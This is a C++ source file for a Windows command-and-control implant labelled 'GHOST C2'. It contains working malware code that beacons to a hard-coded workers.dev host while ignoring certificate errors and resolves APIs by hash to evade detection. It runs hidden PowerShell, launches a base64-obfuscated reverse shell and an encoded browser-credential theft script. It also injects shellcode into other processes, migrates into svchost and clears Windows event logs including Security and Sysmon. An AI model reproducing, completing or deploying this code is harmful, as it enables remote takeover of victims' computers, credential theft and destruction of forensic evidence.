// c2.cpp — GHOST C2 (all features, no unused globals, full Telegram poller)
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>
#include <random>
#include <wincrypt.h>

// ─── No pragma – linked via build.sh ──────────────────────────────────────

namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
    const uint16_t C2_PORT = 443;
}

static std::wstring g_SessionId;
static std::vector<BYTE> g_SessionKey;

// Derive 32-byte key as SHA-256(sessionId) — must match worker's deriveKey(sid)
static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
    std::string utf8 = WStringToUTF8(sessionId);
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::vector<BYTE> result(32, 0);
    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return result;
    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptHashData(hHash, reinterpret_cast<const BYTE*>(utf8.data()), static_cast<DWORD>(utf8.size()), 0);
        DWORD len = 32;
        CryptGetHashParam(hHash, HP_HASHVAL, result.data(), &len, 0);
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
    return result;
}

// ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───

// =====================================================================
//  DEBUG LOGGING
// =====================================================================
static void DebugLog(const wchar_t* msg) {
    OutputDebugStringW(L"[GHOST] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
    // Write to shared log file — no printf, no console required
    char narrow[1024];
    int n = WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow) - 3, nullptr, nullptr);
    if (n > 0) {
        narrow[n - 1] = '\r'; narrow[n] = '\n'; narrow[n + 1] = '\0';
        HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD w; WriteFile(hf, narrow, n + 1, &w, NULL);
            CloseHandle(hf);
        }
    }
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }

// =====================================================================
//  JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());
    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static HMODULE hW = []() -> HMODULE {
            HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
            return m ? m : LoadLibraryA(XS("winhttp.dll"));
        }();
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 20000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  C2 HOST
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  SEND BEACON (encrypted)
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::string plainBody = BuildBeaconJson(session);

    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
    if (enc.empty()) enc = plainBody;

    std::string sid = JsonEscape(WStringToUTF8(session.sessionId));
    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";

    DebugLog(L"Sending encrypted beacon to " + GetC2Host());
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/beacon", encBody, L"");

    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    std::string encCmd = JsonGetString(resp.body, "enc");
    std::string cmd;
    if (!encCmd.empty() && !g_SessionKey.empty()) {
        std::string decrypted = AesGcmDecrypt(g_SessionKey, encCmd);
        if (!decrypted.empty()) {
            cmd = JsonGetString(decrypted, "cmd");
        }
    }
    if (cmd.empty()) cmd = JsonGetString(resp.body, "cmd");

    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT (encrypted)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string plainBody = "{\"session\":\"" + sid +
                            "\",\"output\":\"" + out + "\"}";

    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
    if (enc.empty()) enc = plainBody;

    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";
    DebugLog(L"Sending encrypted result " + std::to_wstring(output.size()) + L" chars");
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/result", encBody, L"");
    return (resp.status == 200);
}

// =====================================================================
//  FILELESS POWERSHELL EXECUTOR
// =====================================================================
static std::wstring RunFilelessPS(const std::string& b64Command) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64Command);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return L"[error: CreateProcess failed]";
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  WALLPAPER
// =====================================================================
static std::wstring HandleWallpaper(const std::string& args) {
    if (args.empty() || args == "reset") {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        return L"[+] Wallpaper reset to default.";
    }
    std::wstring wPath = UTF8ToWString(args);
    if (GetFileAttributesW(wPath.c_str()) == INVALID_FILE_ATTRIBUTES)
        return L"[error: file not found]";
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wPath.c_str(),
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        return L"[+] Wallpaper changed to: " + wPath;
    }
    DWORD err = GetLastError();
    return L"[error: failed to set wallpaper (code=" + std::to_wstring(err) + L")";
}

// =====================================================================
//  REVERSE SHELL (fixed base64 string)
// =====================================================================
static std::wstring HandleReverse(const std::string& args) {
    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
    std::string ip, port = "443";
    size_t colon = args.find(':');
    if (colon == std::string::npos) {
        ip = args;
    } else {
        ip = args.substr(0, colon);
        port = args.substr(colon + 1);
    }

    static const char* b64Template =
        "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnACUASQAlACcALAAlAFAATwBSAFQAJQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABLAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgA9ACQAcwBiACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAZwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAYgB0AD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=";

    std::vector<BYTE> decodedTemplate = Base64Decode(b64Template);
    if (decodedTemplate.empty()) return L"[error: invalid template]";
    std::string script = std::string(reinterpret_cast<char*>(decodedTemplate.data()), decodedTemplate.size());
    size_t pos = script.find("%IP%");
    if (pos != std::string::npos) script.replace(pos, 4, ip);
    pos = script.find("%PORT%");
    if (pos != std::string::npos) script.replace(pos, 6, port);

    std::wstring wScript = UTF8ToWString(script);
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
}

// =====================================================================
//  BROWSER CREDENTIALS (base64‑encoded)
// =====================================================================
static std::wstring HandleBrowser(const std::string& args) {
    static const char* b64Script =
        "JAByAD0AQAoAIgBzAGUAbABlAGMAdAAgAHUAaABlAHIAbgBhAG0AZQAsACAAYQBjAGMA"
        "bwB1AG4AdAAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBvAGYAIABpAGQAIABmAHIAbwBt"
        "ACAATQBpAGMAcgBvAHMAbwBmAHQALgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEA"
        "dABhAC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAQQBDAEUAbwB1AHQAIAA9ACAAIgAi"
        "ADsAIABpAGYAIAAoACQAYwByAGUAZABzACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsA"
        "IAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0"
        "AGUAbQAuAEQAYQB0AGEALgBTAG8AdQByAGMAZQBTAHAAcgBpAG4AZwAuAFMAcQBDAGwA"
        "aQBlAG4AdAAgACgAIgBEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAOwBQ"
        "AG8AbwBsAGkAbgBnAD0ARgBhAGwAcwBlACIAKQA7ACAAJABjAG8AbQBtAGEAbgBkACA9"
        "ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABlAEUAeABlAGMAdQB0AGUAQwBvAG0A"
        "bQBhAG4AZAAoACIAcwBlAGwAZQBjAHQAIAB1AHMAZQByAG4AYQBtAGUALAAgAHAAYQBz"
        "AHMAdwBvAHIAZAAgAEYAUwBSAE0AIABGAEUAUgBOACAARgByAG8AbQAgAEwAbwBnAGkA"
        "bgAgAEQAYQB0AGEAIgApADsAIAAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBh"
        "AG4AZAAuAEUAeABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUA"
        "IAAoACQAcgBlAGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwBy"
        "AGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkA"
        "OwAgACQAYgBhAHMAZQA2ADQAIAA9ACAAWwBDAHIAZQBkAGUAbgB0AGkAYQBsAF0AOgA6"
        "AFUAbgBwAHIAbwB0AGUAYwB0ACgAJAByAGUAYwBvAHIAZAAuAHUAcwBlAHIAbgBhAG0A"
        "ZQAsACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAApADsAIAAkAGMAbABp"
        "AGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQA"
        "YQB0AGEALgBTAG8AdQByAGMAZQBQAHIAbwB2AGkAZABlAHIALgBTAFEAQwBsAGkAZQBu"
        "AHQAIAAoACIANABEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAIgApADsA"
        "IAAkAGMAbwBtAG0AYQBuAGQAIAA9ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABl"
        "AEUAeABlAGMAdQB0AGUAQwBvAG0AbQBhAG4AZAAoACIAcAByAG8AZgBpAGwAZQAgAHUA"
        "cwBlAHIAbgBhAG0AZQAgAGEAcgBjACAAYQBjAGMAbwB1AG4AdAAgAHAAYQBzAHMAdwBv"
        "AHIAZAAgAHUAcwBlAHIAIABpAGQAIABmAHIAbwBtACAATQBpAGMAcgBvAHMAbwBmAHQA"
        "LgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEAdABhAC4AQwByAGUAZABlAG4AdABp"
        "AGEAbAAiACkAOwAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBhAG4AZAAuAEUA"
        "eABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUAIAAoACQAcgBl"
        "AGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwByAGQAIAA9ACAA"
        "JAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkAOwAgACQAYgBh"
        "AHMAZQA2ADQAIAA9ACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAA7ACAA"
        "JABjAHIAZQBkAHMAIAArAD0AIAAiAFMASQBkADoAIAAkAHIAZQBjAG8AcgBkAC4AdQBz"
        "AGUAcgBuAGEAbQBlACAAfAAgACQAYgBhAHMAZQA2ADQAIgA7ACAAfQAgAH0AIAAkAGMA"
        "cgBlAGQAcwA=";

    std::vector<BYTE> decoded = Base64Decode(b64Script);
    if (decoded.empty()) return L"[error: invalid script]";
    std::string script(reinterpret_cast<char*>(decoded.data()), decoded.size());
    std::wstring wScript = UTF8ToWString(script);
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"Browser data:\n" + result;
}


// =====================================================================
//  STUB HANDLERS
// =====================================================================
static std::wstring HandleMigrate(const std::string& args) {
    DWORD targetPid = args.empty() ? FindBestSvchost() : static_cast<DWORD>(atol(args.c_str()));
    if (!targetPid) return L"[error: no target pid]";

    // Inject current image into target and exit
    wchar_t selfPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    HANDLE hFile = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return L"[error: cannot open self]";
    LARGE_INTEGER fsz = {};
    GetFileSizeEx(hFile, &fsz);
    std::vector<BYTE> payload(static_cast<size_t>(fsz.QuadPart));
    DWORD rd = 0;
    ReadFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &rd, nullptr);
    CloseHandle(hFile);
    if (rd != payload.size()) return L"[error: read failed]";

    BOOL ok = InjectRemoteProcess(targetPid, payload.data(), payload.size(), nullptr);
    if (!ok) return L"[error: injection failed into pid=" + std::to_wstring(targetPid) + L"]";
    return L"[+] Migrated into pid=" + std::to_wstring(targetPid);
}

static std::wstring HandleInject(const std::string& args) {
    // args: "<pid> <hex shellcode bytes space-separated>" or "<pid>" with payload from KV
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: !inject <pid> <hex bytes...>";
    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
    if (!pid) return L"[error: invalid pid]";
    std::string hexStr = args.substr(sp + 1);
    std::vector<BYTE> sc;
    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
        if (hexStr[i] == ' ') { --i; continue; }
        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
    }
    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
    BOOL ok = InjectRemoteProcess(pid, sc.data(), sc.size(), nullptr);
    return ok ? L"[+] Injected " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
              : L"[error: injection failed]";
}

static std::wstring HandleInjectApc(const std::string& args) {
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: !inject-apc <pid> <hex bytes...>";
    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
    if (!pid) return L"[error: invalid pid]";
    std::string hexStr = args.substr(sp + 1);
    std::vector<BYTE> sc;
    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
        if (hexStr[i] == ' ') { --i; continue; }
        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
    }
    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
    BOOL ok = InjectViaApc(pid, sc.data(), sc.size());
    return ok ? L"[+] APC queued " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
              : L"[error: APC injection failed]";
}

static std::wstring HandlePs(const std::string& /*args*/) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot failed]";
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    std::wstring out = L"PID      PPID     NAME\n";
    out += L"-------- -------- ------------------------\n";
    if (Process32FirstW(snap, &pe)) {
        do {
            wchar_t line[256];
            swprintf_s(line, L"%-8lu %-8lu %s\n",
                       pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
            out += line;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}
static std::wstring HandleLol(const std::string& /*args*/)     { return L"[lol: not implemented]"; }
static std::wstring HandleExfil(const std::string& /*args*/)   { return L"[exfil: not implemented]"; }
static std::wstring HandleWipe(const std::string& /*args*/) {
    static const wchar_t* kLogs[] = {
        L"System", L"Security", L"Application",
        L"Microsoft-Windows-PowerShell/Operational",
        L"Microsoft-Windows-Sysmon/Operational",
        nullptr
    };
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring wevtutil = std::wstring(sysRoot) + L"\\System32\\wevtutil.exe";
    std::wstring out;
    for (int i = 0; kLogs[i]; ++i) {
        std::wstring cmd = L"\"" + wevtutil + L"\" cl \"" + std::wstring(kLogs[i]) + L"\"";
        STARTUPINFOW si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            DWORD exitCode = 1;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            out += std::wstring(kLogs[i]) + (exitCode == 0 ? L": cleared\n" : L": failed (access denied?)\n");
        } else {
            out += std::wstring(kLogs[i]) + L": spawn failed\n";
        }
    }
    return L"[+] Log wipe complete:\n" + out;
}
static std::wstring HandleLateral(const std::string& /*args*/) { return L"[lateral: not implemented]"; }
static std::wstring HandleCreds(const std::string& /*args*/)   { return L"[creds: not implemented]"; }
static std::wstring HandleDownload(const std::string& /*args*/) { return L"[download: not implemented]"; }
static std::wstring HandleUpload(const std::string& /*args*/)  { return L"[upload: not implemented]"; }

// =====================================================================
//  COMMAND TABLE
// =====================================================================
struct CmdEntry {
    const char* prefix;
    bool        exactMatch;
    std::wstring (*handler)(const std::string& args);
};

static const CmdEntry kCmdTable[] = {
    { "!ps ",         false, HandlePs },
    { "!lol ",        false, HandleLol },
    { "!inject-apc ", false, HandleInjectApc },
    { "!inject ",     false, HandleInject },
    { "!migrate ",    false, HandleMigrate },
    { "!exfil ",      false, HandleExfil },
    { "!wipe",        false, HandleWipe },
    { "!lateral ",    false, HandleLateral },
    { "!creds",       true,  HandleCreds },
    { "ps",           true,  HandlePs },
    { "download ",    false, HandleDownload },
    { "upload ",      false, HandleUpload },
    { "!wallpaper ",  false, HandleWallpaper },
    { "!reverse ",    false, HandleReverse },
    { "!browser",     false, HandleBrowser },
    { "exit",         true,  nullptr },
    { "sleep",        true,  nullptr }
};

// =====================================================================
//  EXECUTE COMMAND (fallback)
// =====================================================================
std::wstring ExecuteCommand(const std::wstring& cmd) {
